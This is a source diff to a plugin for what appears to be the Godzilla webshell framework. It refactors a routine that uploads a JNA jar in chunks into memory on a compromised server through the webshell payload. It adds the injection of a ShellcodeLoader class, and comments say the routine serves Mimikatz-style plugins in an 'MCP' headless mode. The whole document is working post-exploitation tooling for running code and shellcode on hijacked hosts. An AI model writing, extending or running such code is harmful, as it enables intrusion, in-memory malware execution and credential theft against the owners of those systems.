@@ -154,30 +154,48 @@ public class TH_TOOLS extends shells.plugins.generic.TH_TOOLS {
 
     /** MCP 兼容: 绕过 GUI ShellFileManager, 用 payload.bigFileUpload 分片上传 GodzillaJna.jar */
     private boolean mcpLoadJar(byte[] jar) {
+        return mcpLoadJarShared(this.shellEntity, this.payload);
+    }
+
+    /** 共享静态版: 供 Mimikatz 等插件在 MCP 无 frame 场景调用 (include JarLoader.classs + 分片上传 JNA jar + 加载) */
+    public static boolean mcpLoadJarShared(core.shell.ShellEntity shellEntity, core.imp.Payload payload) {
         try {
-            InputStream in = this.getClass().getResourceAsStream("assets/JarLoader.classs");
+            InputStream in = shells.plugins.java.TH_TOOLS.class.getResourceAsStream("assets/JarLoader.classs");
             if (in == null) return false;
             byte[] data = functions.readInputStream(in);
             in.close();
-            if (!this.payload.include("plugin.JarLoader", data)) {
-                Log.log("mcpLoadJar: include JarLoader.classs fail");
+            if (!payload.include("plugin.JarLoader", data)) {
+                Log.log("mcpLoadJarShared: include JarLoader.classs fail");
                 return false;
             }
+            // include ShellcodeLoader.classs (TH_TOOLS.load() 的等价步骤, 供 evalFunc 目标端映射)
+            InputStream slIn = shells.plugins.java.TH_TOOLS.class.getResourceAsStream("assets/ShellcodeLoader.classs");
+            if (slIn == null) return false;
+            byte[] slData = functions.readInputStream(slIn);
+            slIn.close();
+            if (!payload.include("plugin.ShellcodeLoader", slData)) {
+                Log.log("mcpLoadJarShared: include ShellcodeLoader.classs fail");
+                return false;
+            }
+            InputStream jin = shells.plugins.java.TH_TOOLS.class.getResourceAsStream("assets/GodzillaJna.jar");
+            if (jin == null) return false;
+            byte[] jar = functions.readInputStream(jin);
+            jin.close();
             String memFile = "mem://jar" + jar.hashCode();
-            int once = this.shellEntity.getOnceBigFileUploadByteNum();
+            int once = shellEntity.getOnceBigFileUploadByteNum();
             for (int off = 0; off < jar.length; off += once) {
                 byte[] chunk = java.util.Arrays.copyOfRange(jar, off, Math.min(off + once, jar.length));
-                String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
+                String flag = payload.bigFileUpload(memFile, (long)off, chunk);
                 if (!"ok".equals(flag)) {
-                    Log.log("mcpLoadJar: bigFileUpload fail at " + off + " flag=" + flag);
+                    Log.log("mcpLoadJarShared: bigFileUpload fail at " + off + " flag=" + flag);
                     return false;
                 }
             }
             ReqParameter rp = new ReqParameter();
             rp.add("memFileName", memFile);
-            byte[] r = this.payload.evalFunc("plugin.JarLoader", "loadJarFromMemFile", rp);
-            String s = this.encoding.Decoding(r);
-            Log.log("mcpLoadJar: " + s);
+            byte[] r = payload.evalFunc("plugin.JarLoader", "loadJarFromMemFile", rp);
+            String s = core.Encoding.getEncoding(shellEntity).Decoding(r);
+            Log.log("mcpLoadJarShared: " + s);
             return "ok".equals(s);
         } catch (Exception e) {
             Log.error(e);
